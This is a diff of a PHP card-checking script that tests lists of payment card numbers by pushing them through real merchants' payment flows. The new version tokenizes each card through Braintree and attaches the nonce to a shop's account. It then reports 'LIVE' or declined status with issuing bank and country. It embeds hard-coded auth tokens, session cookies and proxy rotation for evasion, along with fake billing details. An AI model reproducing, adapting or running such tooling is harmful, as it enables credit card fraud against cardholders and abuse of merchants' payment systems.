@@ -46,15 +46,10 @@ if($cbin == "3"){
    $cardnum = "$cc1 $cc2 $cc3 $cc4";
 }
 
-
-
-If(strlen($ano) > 2)
-{
-  $ano = substr($ano,2,2);
-}
-
-
-
+// If(strlen($ano) > 2)
+// {
+//   $ano = substr($ano,2,2);
+// }
  function value($str,$find_start,$find_end){
 $start = @strpos($str,$find_start);
 if ($start === false) {
@@ -137,12 +132,12 @@ function ibuuproxy(){
 
 $poxySocks5 = ibuuproxy();
 
-$fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
-$lname = 'Wang';
+// $fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
+// $lname = 'Wang';
 // $email = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
-$email2 = $fname.rand(10,999).'@yopmail.com';
+// $email2 = $fname.rand(10,999).'@yopmail.com';
 // //$password = 'P@5%Word';
-$password2 = 'Hansabhen1@';
+// $password2 = 'Hansabhen1@';
 $counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
 $counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
 
@@ -152,70 +147,50 @@ $dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
 
 
 //============================================================================================================================================================
-function updatecart(){
+ // Request 1
 
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.farmshopaustralia.com/shop/livestock/companion-animals/1-5lt-birdpoultry-tower-drinker/');
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-   // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
-   // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/2xhr5rv77mpmcqvn/client_api/v1/payment_methods/credit_cards?sharedCustomerIdentifierType=undefined&braintreeLibraryVersion=&authorizationFingerprint=eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTA3Njk5NjUsImp0aSI6IjZjZjY4ZjE0LTEyZDctNDYyYy04NTM1LWRhZTk4MjBjNzY1MCIsInN1YiI6IjJ4aHI1cnY3N21wbWNxdm4iLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjJ4aHI1cnY3N21wbWNxdm4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6e319.5TZmFytOQBvd1ANQ1OqDdsNsplB_F8RD07sA7oe20FFCU--WbnVLXEc01XjM2Oe19YRWO4TcgQQAwD_QFlcqHw&_meta%5Bintegration%5D=custom&_meta%5Bsource%5D=form&_meta%5BsessionId%5D=92b7f136-b1c7-44a2-95c0-03db843f6987&share=undefined&&creditCard%5Bnumber%5D='.$cc.'&creditCard%5BexpirationDate%5D='.$mes1.'%2F'.$ano.'&creditCard%5BcardholderName%5D=VIncent%20Warner&creditCard%5Bcvv%5D='.$cvv.'&creditCard%5Boptions%5D%5Bvalidate%5D=false&_method=POST&callback=callback_jsond575dbb040464f2bb369400a2638fafe');
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
 // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+// curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
+// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
+curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
+# Uncomment the upper two lines if you have filled the upper login details
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+'Accept: */*',
 'Accept-Encoding: gzip, deflate, br',
 'Accept-Language: en-US,en;q=0.9',
-'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu2trXQJjayDO4cu5',
-'Cookie: PHPSESSID=24h0g48mjhbh9iv37gjku3h6r6; wordpress_logged_in_3b23170009d87d5fb89275ed5e46d5db=hotshot69%7C1591713172%7CILS5ZGijYSr5Yx64BbYOi945l7y12wZYYuVjy9KNG2W%7Cac74adef1c913ff08eaf02ddcf4e8d69d2c420f90b05ec036be62ab44ab9978f; wp_woocommerce_session_3b23170009d87d5fb89275ed5e46d5db=1201%7C%7C1590676287%7C%7C1590672687%7C%7Cb800b9e989c497314608e2d30f90d8c9; mailchimp_email_id=000f9e89c1',
-'Host: www.farmshopaustralia.com',
-'Origin: https://www.farmshopaustralia.com',
-'Referer: https://www.farmshopaustralia.com/shop/livestock/companion-animals/1-5lt-birdpoultry-tower-drinker/',
+'Host: api.braintreegateway.com',
+'Referer: https://api.braintreegateway.com/',
 'user-agent: '.$browser.''
 ));
-
-curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryu2trXQJjayDO4cu5
-Content-Disposition: form-data; name="tm-epo-counter"
-
-1
-------WebKitFormBoundaryu2trXQJjayDO4cu5
-Content-Disposition: form-data; name="tcaddtocart"
-
-37018
-------WebKitFormBoundaryu2trXQJjayDO4cu5
-Content-Disposition: form-data; name="quantity"
-
-1
-------WebKitFormBoundaryu2trXQJjayDO4cu5
-Content-Disposition: form-data; name="add-to-cart"
-
-37018
-------WebKitFormBoundaryu2trXQJjayDO4cu5--');
-
+// curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"3fd73831-cbf0-4980-9711-99d59e97a4ba"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"13901","streetAddress":"661 STATE ST"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
 
 $b_pago = curl_exec($ch);
-}
-//  // echo $b_pago;
-//  $token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
-// $issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
-// $issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
-// $debit = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
-// $prepaid = trim(strip_tags(getstr($b_pago,'"prepaid":"','"')));
-// $cardtype = trim(strip_tags(getstr($b_pago,'"cardType":"','"')));
+
+curl_close($ch);
+
+   // echo $b_pago;
+$token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
+// $token2 = trim(strip_tags(getstr($b_pago,'"client_secret": "','"')));
+$issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
+$issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
+$type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
+$category = trim(strip_tags(getstr($b_pago,'"commercial":"','"')));
 
 
-// //////////////////////// START REQUEST 2 ////////////////////////
+
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.farmshopaustralia.com/?wc-ajax=checkout');
+curl_setopt($ch, CURLOPT_URL, 'https://backend.theartofpingpong.co.uk/api/me/payment_methods/');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -236,31 +211,30 @@ curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING T
 // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 // End Proxy Calls
+curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+ curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: application/json, text/javascript, */*; q=0.01',
-'accept-encoding: gzip, deflate, br',
-'accept-language: en-US,en;q=0.9',
-'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'Cookie: PHPSESSID=24h0g48mjhbh9iv37gjku3h6r6; wordpress_logged_in_3b23170009d87d5fb89275ed5e46d5db=hotshot69%7C1591713172%7CILS5ZGijYSr5Yx64BbYOi945l7y12wZYYuVjy9KNG2W%7Cac74adef1c913ff08eaf02ddcf4e8d69d2c420f90b05ec036be62ab44ab9978f; wp_woocommerce_session_3b23170009d87d5fb89275ed5e46d5db=1201%7C%7C1590676287%7C%7C1590672687%7C%7Cb800b9e989c497314608e2d30f90d8c9; mailchimp_email_id=000f9e89c1; woocommerce_items_in_cart=1; woocommerce_cart_hash=50b50270f9173e53c11ae899360a9f7f',
-'Host: www.farmshopaustralia.com',
-'Origin: https://www.farmshopaustralia.com',
-'Referer: https://www.farmshopaustralia.com/checkout/',
-'user-agent: '.$browser.'',
+'Accept: application/json',
+'Accept-Encoding: gzip, deflate, br',
+'Accept-Language: en-US,en;q=0.9',
+'Authorization: Token 584a6ee97390f0b97ec80ffcef4abeec164fc6d7',
+'Content-Type: application/json',
+'Host: backend.theartofpingpong.co.uk',
+'Origin: http://www.theartofpingpong.co.uk',
+'Referer: http://www.theartofpingpong.co.uk/complete-profile',
+'user-agent: '.$browser.''
 ));
 
-// //////////////////////// START POST FILED 1 ////////////////////////
+//////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Megha&billing_last_name=Shyam&billing_company=&billing_country=AU&billing_address_1=661+STATE+ST&billing_address_2=&billing_city=BINGHAMTON&billing_state=NSW&billing_postcode=2150&billing_phone=0424152415&billing_email=pubgkittu%40gmail.com&shipping_first_name=Megha&shipping_last_name=Shyam&shipping_company=&shipping_country=AU&shipping_address_1=661+STATE+ST&shipping_address_2=&shipping_city=BINGHAMTON&shipping_state=NSW&shipping_postcode=2150&order_comments=&shipping_method%5B0%5D=table_rate%3A1%3A1&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&terms=on&terms-field=1&woocommerce-process-checkout-nonce=19f60ce99f&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payment_method_nonce":"'.$token.'"}');
 
-
-
-// //*****************************************************************************************************************************************************************************************************************************************************************************
+// // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
 
 $result = curl_exec($ch);
@@ -268,24 +242,32 @@ if (curl_errno($ch)) {
     echo 'Error:'.curl_error($ch);
 }
 curl_close($ch);
-$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\">\n\t\t\t<li>Payment failed: ','<\/li>\n\t<\/ul>\n"')));
-// // $result = json_decode($result, true);
-// // $code = trim(strip_tags(getstr($result,'"message":"','"')));
-// // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
+
+$message = trim(strip_tags(getstr($result,'"detail":"','"')));
+//  // $code = trim(strip_tags(getstr($result,'"status":"','"')));
+//  // $message2 = trim(strip_tags(getstr($result,'"decline_code": "','"')));
 
 
+// //////////////////////// BIN INFO ////////////////////////////////
 
-if(strpos($result,'"result":"failure"')){
-      echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
-    }
-else {
-  updatecart();
-  echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
+// /////////////////// RESULT ////////////////////////////////////
+// if(strpos($result,'"result":"success"')){
+//     echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
 
-  }
+
+//    }
+// elseif(strpos($result,'Insufficient Funds')){
+//   echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
+//    }
+// else {
+
+       echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
+
+// // updatecart();
+// }
+
 curl_close($curl);
 ob_flush();
-// echo $result
-    //echo $result;
+       // echo $result;
 //echo $browser;
 ?>
